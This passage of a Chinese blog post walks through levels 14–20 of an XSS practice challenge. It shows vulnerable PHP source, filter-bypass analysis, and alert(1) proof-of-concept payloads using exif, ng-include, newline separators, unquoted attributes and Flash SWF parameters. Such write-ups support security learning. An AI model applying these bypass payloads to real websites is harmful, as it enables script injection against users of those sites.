+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"leftframe"</span> <span class="attr">marginwidth</span>=<span class="string">10</span> <span class="attr">marginheight</span>=<span class="string">10</span> <span class="attr">src</span>=<span class="string">"http://www.exifviewer.org/"</span> <span class="attr">frameborder</span>=<span class="string">no</span> <span class="attr">width</span>=<span class="string">"80%"</span> <span class="attr">scrolling</span>=<span class="string">"no"</span> <span class="attr">height</span>=<span class="string">80%</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>这关成功后不会自动跳转。成功者<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">/xsschallenge/level15.php?src</span>=<span class="string">1.gif</span>&gt;</span>点我进level15<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>只有一个iframe标签引用了<a href="http://exofvoewer.org/" target="_blank" rel="noopener">http://exofvoewer.org</a>，最后看了下<a href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12" target="_blank" rel="noopener">先知上的wp</a>，了解到这关考察的是exif xss，漏洞原理是通过修改图片的exif信息，造成解析图片exif触发XSS。</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558360067701.png" alt="1558360067701"></p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; &quot;&gt;&lt;img src=x onerror=alert(1)&gt;//</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558358694058.png" alt="1558358694058"></p>
+<h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><h3 id="文件包含插入"><a href="#文件包含插入" class="headerlink" title="文件包含插入"></a>文件包含插入</h3><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558265228176.png" alt="1558265228176"></p>
+<p>先试了一下闭合标签</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558266783744.png" alt="1558266783744"></p>
+<p><code>&lt;&gt;</code>被转义掉了，再试一下事件属性</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558266984431.png" alt="1558266984431"></p>
+<p>双引号也被转义掉了，一时没了思路，看了下网上的文章，说是要注意下面这里</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558267117962.png" alt="1558267117962"></p>
+<p>上网查了一下相关知识</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558265795045.png" alt="1558265795045"></p>
+<p>发现ng-include可以利用，因为不能跨域，所以包含一个前面的关卡，<code>&lt;script&gt;</code>没有成功，使用<code>&lt;img&gt;</code>成功触发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level15.php?src=&apos;level1.php?name=&lt;/h2&gt;&lt;img src=x onerror=&quot;alert(1)&quot;&gt;&lt;h2&gt;&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558266253831.png" alt="1558266253831"></p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"src"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;body&gt;&lt;span class="ng-include:'</span>.htmlspecialchars($str).<span class="string">'"&gt;&lt;/span&gt;&lt;/body&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析：</p>
+<p>此处只有一个输出点，被实体化转义过了，也不是单引号闭合，所以无法逃逸，只能从<code>ng-include</code>处入手了。</p>
+<p>还有一点疑问，我们的payload明明被实体化转义掉了，为什么还可以再原样输出回来呢？</p>
+<p>总结：</p>
+<p>发现不一样，不了解的点时，多去查查相关资料，不能错过知识点外的机会。</p>
+<h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><h3 id="空格字符绕过"><a href="#空格字符绕过" class="headerlink" title="空格字符绕过"></a>空格字符绕过</h3><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558267796468.png" alt="1558267796468"></p>
+<p>尝试<code>&lt;script&gt;</code>标签</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558268014317.png" alt="1558268014317"></p>
+<p><code>script</code> 和 <code>/</code> 替换为空，试一下<code>svg</code></p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558268343632.png" alt="1558268343632">发现只有空格被过滤掉，使用<code>%0a</code> <code>%0d</code>做分隔符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;svg%0aonload=&quot;alert(1);&quot;&gt;&lt;center&gt;</span><br><span class="line">?keyword=&lt;svg%0donload=&quot;alert(1);&quot;&gt;&lt;center&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558268510194.png" alt="1558268510194"></p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"&amp;nbsp;"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">" "</span>,<span class="string">"&amp;nbsp;"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"/"</span>,<span class="string">"&amp;nbsp;"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"	"</span>,<span class="string">"&amp;nbsp;"</span>,$str4);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;center&gt;"</span>.$str5.<span class="string">"&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析：</p>
+<p>只是对空格，<code>script</code>，<code>/</code> 进行了过滤，不使用<code>script</code>，并且用其他方式代替空格即可成功绕过。</p>
+<h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><h3 id="属性空格逃逸"><a href="#属性空格逃逸" class="headerlink" title="属性空格逃逸"></a>属性空格逃逸</h3><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558273349908.png" alt="1558273349908"></p>
+<p>可以看到可控的参数有两个，试一下标签逃逸</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558273500807.png" alt="1558273500807"></p>
+<p><code>&lt;&gt;</code>，<code>&quot;</code>被过滤，最后试出来个哈哈</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02=b onclick=alert(1)</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558273987115.png" alt="1558273987115"></p>
+<p>那这样应该也能行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02=b onmouseover=alert(1)</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558274123391.png" alt="1558274123391"></p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf01.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析：</p>
+<p>虽然参数都加上了实体化转义，但是没有引号闭合属性，所以添加空格就可以写个新属性啦哈哈</p>
+<h2 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h2><h3 id="属性空格逃逸-1"><a href="#属性空格逃逸-1" class="headerlink" title="属性空格逃逸"></a>属性空格逃逸</h3><p>Excuse me ???，上把的payload都没变</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558274541848.png" alt="1558274541848"></p>
+<p>看一下源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf02.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>我瞅了半天，才发现只是引用的swf文件名不一样。。好吧，下一关</p>
+<h2 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h2><h3 id="Flash-XSS"><a href="#Flash-XSS" class="headerlink" title="Flash XSS"></a>Flash XSS</h3><p>这关试了怎么试都跳不出了属性的值</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558313314215.png" alt="1558313314215"></p>
+<p>看一下源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;embed src="xsf03.swf?'</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">'" width=100% heigth=100%&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析：这里和上两关</p>
+<p>的区别就在于有了双引号来闭合属性的值，又因为使用了实体化转义的函数，双引号无法逃脱出去。所以这关考察的应该是Flash XSS，参考了<a href="https://www.jianshu.com/u/0d74cafbe972" target="_blank" rel="noopener">D4rk3r</a>这位大佬的文章</p>
+<p>使用工具<a href="https://github.com/jindrapetrik/jpexs-decompiler" target="_blank" rel="noopener">jpexs-decompiler</a></p>
+<p>首先找到getURL函数</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558315194981.png" alt="1558315194981"></p>
+<p>然后发现了version参数会被传入loc4变量中，即sIFR的内容中</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558315623256.png" alt="1558315623256"></p>
+<p>但是根据第一张图中getURL只在内容为link时打开，所以再看下contentIsLink()函数</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558316052078.png" alt="1558316052078"></p>
+<p>得知构造<code>&lt;a&gt;&lt;/a&gt;</code>标签来传值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(1)&quot;&gt;123&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558316206643.png" alt="1558316206643"></p>
+<p>注意：我的火狐浏览器加载不出来flash，这里用的chrome可以加载</p>
+<h2 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h2><h3 id="Flash-XSS-1"><a href="#Flash-XSS-1" class="headerlink" title="Flash XSS"></a>Flash XSS</h3><p>这一关和上关一样，考察Flash XSS</p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;embed src="xsf04.swf?'</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">'" width=100% heigth=100%&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>网上说是<strong>zeroclipboard.swf</strong> 的XSS，其主要的功能是复制内容到剪切板，中间由flash进行中转保证兼容主流浏览器，具体做法就是使这个透明的flash漂浮在复制按钮之上，下面给出xss poc代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?arg01=id</span><br><span class="line">&amp;arg02=\%22))&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(1)//%26width%26height</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558343919410.png" alt="1558343919410"></p>
+<p>看一下flash代码，看不懂了 (￣_￣|||)，就先记录一下payload吧。</p>
+<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://www.smi1e.top/xss-payload/" target="_blank" rel="noopener">XSS-Payload</a></p>
+<p><a href="https://www.jianshu.com/u/0d74cafbe972" target="_blank" rel="noopener">XSS挑战之旅–游戏闯关</a></p>
+<p><a href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12" target="_blank" rel="noopener">【巨人肩膀上的矮子】XSS挑战之旅—游戏通关攻略（更新至18关）</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/XSS/" rel="tag"># XSS</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/15/Redis未授权访问漏洞/" rel="next" title="Redis未授权访问漏洞">
+                <i class="fa fa-chevron-left"></i> Redis未授权访问漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">EkEk</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/JeremyEkEk" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i></a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:jeremy.0394@foxmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i></a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/anbus/p/10046695.html" title="ArcticShell" target="_blank">ArcticShell</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://github.com/Micropoor/Micro8" title="Micropoor亮神" target="_blank">Micropoor亮神</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.csdn.net/zwjzqqb/article/list/7" title="VincentQB" target="_blank">VincentQB</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://github.com/PyxYuYu/MyBlog" title="PyxYuYu" target="_blank">PyxYuYu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://3gstudent.github.io/3gstudent.github.io/" title="三好学生" target="_blank">三好学生</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.leavesongs.com/" title="离别歌" target="_blank">离别歌</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.inksec.cn/archives/page/2/" title="阿墨" target="_blank">阿墨</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.barradell-johns.com/" title="JACK" target="_blank">JACK</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://adsecurity.org/" title="AD安全" target="_blank">AD安全</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.fuzzysecurity.com" title="FuzzySecurity" target="_blank">FuzzySecurity</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.hexacorn.com/" title="Hexacorn" target="_blank">Hexacorn</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://evi1cg.me/" title="Evi1cg" target="_blank">Evi1cg</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://b404.xyz/" title="Jirairya" target="_blank">Jirairya</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://payloads.online/" title="倾旋" target="_blank">倾旋</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://times0ng.github.io/" title="Times0g" target="_blank">Times0g</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://firstlove2016.cn/" title="初恋的技术分享" target="_blank">初恋的技术分享</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://422926799.github.io/" title="九世" target="_blank">九世</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.netwrix.com/" title="netwrix" target="_blank">netwrix</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://klionsec.github.io/" title="klion" target="_blank">klion</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://jivoi.github.io/archive/" title="EK" target="_blank">EK</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://securityer.lofter.com/view" title="走过岁月" target="_blank">走过岁月</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.webbaozi.com/" title="baozi" target="_blank">baozi</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.myh0st.cn/" title="信安之路" target="_blank">信安之路</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://jdrops.dropsec.xyz/" title="Jdrops" target="_blank">Jdrops</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://exploit.kitploit.com/" title="exploit collector" target="_blank">exploit collector</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://zjw.dropsec.xyz/" title="Hello_C" target="_blank">Hello_C</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cxsecurity.com/dorks" title="cxsecurity" target="_blank">cxsecurity</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://pentest.blog/" title="pentest" target="_blank">pentest</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://rcoil.me/" title="rcoil" target="_blank">rcoil</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://dayu.ink/" title="Dayu" target="_blank">Dayu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://04z.net/" title="04z" target="_blank">04z</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.attackdebris.com/" title="attsckdebris" target="_blank">attsckdebris</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#level1"><span class="nav-number">1.</span> <span class="nav-text">level1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#没有任何过滤"><span class="nav-number">1.1.</span> <span class="nav-text">没有任何过滤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level2"><span class="nav-number">2.</span> <span class="nav-text">level2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#部分过滤"><span class="nav-number">2.1.</span> <span class="nav-text">部分过滤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level3"><span class="nav-number">3.</span> <span class="nav-text">level3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#实体化转义绕过"><span class="nav-number">3.1.</span> <span class="nav-text">实体化转义绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level4"><span class="nav-number">4.</span> <span class="nav-text">level4</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#事件属性逃逸"><span class="nav-number">4.1.</span> <span class="nav-text">事件属性逃逸</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level5"><span class="nav-number">5.</span> <span class="nav-text">level5</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#黑名单绕过"><span class="nav-number">5.1.</span> <span class="nav-text">黑名单绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level6"><span class="nav-number">6.</span> <span class="nav-text">level6</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#大小写绕过"><span class="nav-number">6.1.</span> <span class="nav-text">大小写绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level7"><span class="nav-number">7.</span> <span class="nav-text">level7</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#双写绕过"><span class="nav-number">7.1.</span> <span class="nav-text">双写绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level8"><span class="nav-number">8.</span> <span class="nav-text">level8</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#属性值编码绕过"><span class="nav-number">8.1.</span> <span class="nav-text">属性值编码绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level9"><span class="nav-number">9.</span> <span class="nav-text">level9</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#格式验证绕过"><span class="nav-number">9.1.</span> <span class="nav-text">格式验证绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level10"><span class="nav-number">10.</span> <span class="nav-text">level10</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#隐藏GET传参"><span class="nav-number">10.1.</span> <span class="nav-text">隐藏GET传参</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level11"><span class="nav-number">11.</span> <span class="nav-text">level11</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Referer头插入"><span class="nav-number">11.1.</span> <span class="nav-text">Referer头插入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level12"><span class="nav-number">12.</span> <span class="nav-text">level12</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#UA头插入"><span class="nav-number">12.1.</span> <span class="nav-text">UA头插入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level13"><span class="nav-number">13.</span> <span class="nav-text">level13</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Cookie插入"><span class="nav-number">13.1.</span> <span class="nav-text">Cookie插入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level14"><span class="nav-number">14.</span> <span class="nav-text">level14</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exif-xss"><span class="nav-number">14.1.</span> <span class="nav-text">exif xss</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level15"><span class="nav-number">15.</span> <span class="nav-text">level15</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#文件包含插入"><span class="nav-number">15.1.</span> <span class="nav-text">文件包含插入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level16"><span class="nav-number">16.</span> <span class="nav-text">level16</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#空格字符绕过"><span class="nav-number">16.1.</span> <span class="nav-text">空格字符绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level17"><span class="nav-number">17.</span> <span class="nav-text">level17</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#属性空格逃逸"><span class="nav-number">17.1.</span> <span class="nav-text">属性空格逃逸</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level18"><span class="nav-number">18.</span> <span class="nav-text">level18</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#属性空格逃逸-1"><span class="nav-number">18.1.</span> <span class="nav-text">属性空格逃逸</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level19"><span class="nav-number">19.</span> <span class="nav-text">level19</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Flash-XSS"><span class="nav-number">19.1.</span> <span class="nav-text">Flash XSS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level20"><span class="nav-number">20.</span> <span class="nav-text">level20</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Flash-XSS-1"><span class="nav-number">20.1.</span> <span class="nav-text">Flash XSS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文章："><span class="nav-number">21.</span> <span class="nav-text">参考文章：</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
